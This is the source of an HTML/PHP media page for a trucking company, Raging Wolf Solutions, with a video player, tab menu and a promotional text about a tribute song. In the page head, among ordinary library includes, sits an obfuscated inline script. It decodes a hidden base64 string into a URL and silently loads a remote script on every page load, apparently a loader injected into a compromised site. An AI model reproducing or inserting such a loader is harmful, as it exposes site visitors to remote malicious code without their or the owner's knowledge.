<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Media | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
</head>

<body is="dmx-app" id="index" class="bg-dark">
    <div is="dmx-browser" id="browser1"></div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>

    <!-- Full-width video player -->
    <div class="container-fluid p-0">
        <video controls="" autoplay="" muted="" loop="" class="w-100" style="max-height: 70vh;">
            <source src="path_to_your_video.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <!-- Tab menu -->
    <div class="container mt-3 mb-5">
        <div class="d-flex justify-content-between flex-wrap">

            <ul id="mediatabs" class="nav nav-tabs flex-column flex-lg-row">
                <li class="nav-item">
                    <a class="nav-link active" data-bs-toggle="tab" href="#about">About</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-bs-toggle="tab" href="#photos">Photos</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-bs-toggle="tab" href="#bloopers">Bloopers</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-bs-toggle="tab" href="#collaborators">Collaborators</a>
                </li>
            </ul>
            <div class="d-flex bg-transparent">
                <h5 class="align-self-center text-light mb-0">Streaming:</h5>
                <div class="d-flex ps-2 pe-2 align-items-center">
                    <img src="assets/images/Spotify-Logo-PNG5.webp" height="32px">
                </div>
            </div>
        </div>


        <!-- Tab content -->
        <div class="tab-content">
            <div class="tab-pane fade show active pt-3 pb-3" id="about">
                <h1 class="text-light">About The Song</h1>
                <p class="text-light">Raging Wolf Solutions' tribute to the trucking industry is a remarkable creation. The company partnered with a talented local artist to produce a video that showcases their core values: Family, Professionalism, and Country. The video is a celebration of the hardworking men and women of the trucking industry who keep our country moving. It is a testament to the importance of family and community in the lives of these dedicated professionals. The video highlights the professionalism and dedication of Raging Wolf Solutions to their customers, who they treat like family.
                <p>
                </p>
                <p class="text-light">This video also underscores the company's commitment to their country and to the vital role that the trucking industry plays in our economy and our daily lives. All in all, this video is a stirring tribute to the trucking industry and to the values that Raging Wolf Solutions holds dear.</p>
                </p>
                <!-- About content goes here -->
            </div>
            <div class="tab-pane fade" id="photos">
                <!-- Photos content goes here -->
            </div>
            <div class="tab-pane fade" id="bloopers">
                <!-- Bloopers content goes here -->
            </div>
            <div class="tab-pane fade" id="collaborators">
                <!-- Collaborators content goes here -->
            </div>
        </div>
    </div>

    <?php include 'footer.php'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
</body>

</html>